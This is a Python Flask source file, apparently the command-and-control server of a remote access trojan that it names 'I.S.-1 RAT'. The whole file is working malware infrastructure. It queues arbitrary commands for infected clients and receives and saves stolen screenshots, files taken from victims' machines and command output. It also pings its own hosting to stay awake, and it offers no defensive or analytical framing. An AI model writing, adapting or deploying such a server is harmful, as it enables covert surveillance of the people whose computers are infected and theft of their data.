from flask import Flask, request
import base64
import os
import threading
import time
import urllib.request
from datetime import datetime

app = Flask(__name__)

# Хранилище: { client_id: {"cmd": "screenshot", "pending": True} }
pending_commands = {}

# Автопинг (чтоб не засыпал)
def auto_ping():
    render_url = os.environ.get('RENDER_EXTERNAL_URL')
    if not render_url:
        render_url = "https://ТВОЙ-СЕРВЕР.onrender.com"  # ЗАМЕНИ!!!
    def ping():
        while True:
            try:
                req = urllib.request.Request(render_url, headers={'User-Agent': 'Mozilla/5.0'})
                with urllib.request.urlopen(req, timeout=10) as resp:
                    print(f"Ping OK: {resp.status}")
            except Exception as e:
                print(f"Ping error: {e}")
            time.sleep(600)
    threading.Thread(target=ping, daemon=True).start()

@app.route('/api', methods=['GET'])
def get_command():
    client_id = request.args.get('id')
    if not client_id:
        return "no id", 400
    if client_id in pending_commands and pending_commands[client_id].get("pending"):
        cmd = pending_commands[client_id]["cmd"]
        pending_commands[client_id]["pending"] = False
        print(f"Выдаю команду {cmd} для {client_id}")
        return cmd
    return ""

@app.route('/api/upload', methods=['POST'])
def upload():
    client_id = request.form.get('id')
    data = request.form.get('data')
    if not client_id or not data:
        return "fail"
    # Сохраняем скриншот или результат
    filename = f"log_{client_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    if data.startswith("SCREEN:"):
        img_data = data[7:]
        filename = f"screenshot_{client_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        with open(filename, "wb") as f:
            f.write(base64.b64decode(img_data))
    elif data.startswith("FILE:"):
        # Формат: FILE:путь:base64
        parts = data.split(":", 2)
        if len(parts) == 3:
            file_path = parts[1]
            file_data = parts[2]
            filename = f"uploaded_{client_id}_{os.path.basename(file_path)}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            with open(filename, "wb") as f:
                f.write(base64.b64decode(file_data))
    else:
        with open(filename, "w", encoding="utf-8") as f:
            f.write(data)
    print(f"Сохранён результат в {filename}")
    return "ok"

@app.route('/api/send', methods=['POST'])
def send_command():
    client_id = request.form.get('id') or request.json.get('id')
    cmd = request.form.get('cmd') or request.json.get('cmd')
    if client_id and cmd:
        pending_commands[client_id] = {"cmd": cmd, "pending": True}
        print(f"Поставлена команда {cmd} для {client_id}")
        return "ok"
    return "fail"

@app.route('/')
def home():
    return "I.S.-1 RAT Server Running"

if __name__ == '__main__':
    auto_ping()
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
